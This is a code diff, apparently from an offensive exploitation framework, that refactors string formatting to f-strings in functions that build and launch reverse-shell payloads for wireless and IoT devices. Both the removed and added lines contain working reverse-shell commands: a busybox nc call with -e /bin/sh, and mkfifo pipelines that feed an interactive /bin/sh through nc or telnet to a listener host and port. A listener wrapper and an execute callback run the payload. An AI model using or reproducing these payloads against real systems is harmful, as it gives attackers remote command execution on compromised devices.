@@ -36,19 +36,19 @@ def _wireless_payload(shell_type: str, lhost: str, lport: int) -> str:
     t = shell_type.lower().strip()
 
     if t == "busybox_nc":
-        return "busybox nc {} {} -e /bin/sh".format(lhost, lport)
+        return f"busybox nc {lhost} {lport} -e /bin/sh"
 
     if t == "mkfifo":
         return (
             "rm -f /tmp/.f; mkfifo /tmp/.f; "
-            "cat /tmp/.f | /bin/sh -i 2>&1 | nc {} {} > /tmp/.f"
-        ).format(lhost, lport)
+            f"cat /tmp/.f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/.f"
+        )
 
     if t == "telnet_reverse":
         return (
             "rm -f /tmp/.f; mkfifo /tmp/.f; "
-            "cat /tmp/.f | /bin/sh -i 2>&1 | telnet {} {} > /tmp/.f"
-        ).format(lhost, lport)
+            f"cat /tmp/.f | /bin/sh -i 2>&1 | telnet {lhost} {lport} > /tmp/.f"
+        )
 
     return generate_payload(t, lhost, lport)
 
@@ -68,11 +68,11 @@ def spawn_wireless_shell(
     """Spawn a reverse shell from a wireless/IoT exploit."""
     payload = _wireless_payload(shell_type, lhost, lport)
     if not payload:
-        print("[-] [wireless-shell] Unknown shell type: '{}'".format(shell_type))
+        print(f"[-] [wireless-shell] Unknown shell type: '{shell_type}'")
         return False
 
-    print("[*] [wireless-shell] Payload: {}".format(shell_type))
-    print("[*] [wireless-shell] Listener: {}:{}".format(lhost, lport))
+    print(f"[*] [wireless-shell] Payload: {shell_type}")
+    print(f"[*] [wireless-shell] Listener: {lhost}:{lport}")
 
     with ReverseListener(lhost, lport, timeout, pty_upgrade=True) as ln:
         if execute_fn is not None:
@@ -81,7 +81,7 @@ def spawn_wireless_shell(
                 try:
                     execute_fn(payload)
                 except Exception as exc:
-                    print("[-] [wireless-shell] Execute: {}".format(exc))
+                    print(f"[-] [wireless-shell] Execute: {exc}")
 
             t = threading.Thread(target=_exec, daemon=True)
             t.start()
